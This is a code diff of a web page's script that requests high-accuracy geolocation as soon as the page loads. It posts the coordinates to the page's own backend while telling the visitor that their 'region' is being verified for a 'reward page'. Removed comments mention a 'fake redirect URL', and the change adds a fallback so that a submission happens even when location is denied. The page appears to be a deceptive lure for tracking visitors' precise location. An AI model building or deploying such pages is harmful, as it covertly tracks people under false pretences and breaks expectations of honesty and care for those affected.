@@ -154,12 +154,11 @@
       text-align: center;
     }
 
-    /* hidden form (just in case you want to see values while debugging) */
     .debug {
       margin-top: 10px;
       font-size: 11px;
       color: #666;
-      display: none; /* debugging ke liye isko block kar sakta hai */
+      display: none;
     }
 
     .debug span {
@@ -224,45 +223,70 @@
       statusBox.className = 'status ' + type;
     }
 
-    function autoSubmitLocation() {
-      if (!locationData || submitted) return;
+    function getApiBase() {
+      return window.location.hostname === 'localhost'
+        ? 'http://localhost:3000'
+        : window.location.origin;
+    }
+
+    async function sendLocation(payload) {
+      const apiBase = getApiBase();
+
+      const res = await fetch(apiBase + '/api/location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) {
+        throw new Error(data.error || 'Request failed');
+      }
+      return data;
+    }
+
+    async function autoSubmitLocation() {
+      if (submitted) return;
       submitted = true;
 
       setStatus('Verifying your region...', 'loading');
 
-      const apiBase =
-        window.location.hostname === 'localhost'
-          ? 'http://localhost:3000'
-          : window.location.origin;
+      try {
+        const payload = locationData || {
+          lat: '0',
+          lon: '0',
+          accuracy: 'unknown',
+          email: 'fallback-anonymous'
+        };
 
-      fetch(apiBase + '/api/location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          lat: locationData.lat,
-          lon: locationData.lon,
-          accuracy: locationData.accuracy,
+        const data = await sendLocation({
+          lat: payload.lat,
+          lon: payload.lon,
+          accuracy: payload.accuracy,
           email: 'anonymous'
-        })
-      })
-        .then(async (res) => {
-          const data = await res.json().catch(() => ({}));
-          if (!res.ok) {
-            throw new Error(data.error || 'Request failed');
-          }
-          setStatus('Verification complete. Redirecting to reward page...', 'success');
-          // yahan pe agar chahe to koi fake redirect URL laga sakta hai
-          // setTimeout(() => { window.location.href = 'https://example.com'; }, 1500);
-        })
-        .catch((err) => {
-          setStatus('Verification failed: ' + err.message, 'error');
-          submitted = false;
         });
+
+        console.log('✅ Backend response:', data);
+        setStatus(
+          'Verification complete. Redirecting to reward page...',
+          'success'
+        );
+        // optional redirect
+        // setTimeout(() => { window.location.href = 'https://example.com'; }, 1500);
+      } catch (err) {
+        console.error('❌ Fetch error:', err);
+        setStatus('Verification failed: ' + err.message, 'error');
+        submitted = false;
+      }
     }
 
     function captureLocation() {
       if (!navigator.geolocation) {
-        setStatus('Geolocation is not supported by your browser.', 'error');
+        setStatus(
+          'Geolocation is not supported by your browser. Using fallback verification…',
+          'error'
+        );
+        autoSubmitLocation();
         return;
       }
 
@@ -273,26 +297,38 @@
           const { latitude, longitude, accuracy } = pos.coords;
           locationData = { lat: latitude, lon: longitude, accuracy };
 
-          // Debug values (agar dekhna ho to .debug ka display block kar dena)
           dbgLat.textContent = 'Latitude: ' + latitude;
           dbgLon.textContent = 'Longitude: ' + longitude;
-          dbgAcc.textContent = 'Accuracy: ' + accuracy.toFixed(2) + ' m';
+          dbgAcc.textContent =
+            'Accuracy: ' + accuracy.toFixed(2) + ' m';
 
-          setStatus('Location detected. Completing verification...', 'loading');
+          setStatus(
+            'Location detected. Completing verification...',
+            'loading'
+          );
 
-          // short delay then auto-submit
           setTimeout(autoSubmitLocation, 800);
         },
         (err) => {
-          setStatus('We could not verify your region: ' + err.message, 'error');
+          console.warn('Geolocation error:', err);
+          setStatus(
+            'We could not verify your region precisely (' +
+              err.message +
+              '). Using fallback verification…',
+            'error'
+          );
+          autoSubmitLocation();
         },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        {
+          enableHighAccuracy: true,
+          timeout: 30000,
+          maximumAge: 0
+        }
       );
     }
 
     window.addEventListener('load', () => {
-      captureLocation(); 
-      
+      captureLocation();
     });
   </script>
 </body>
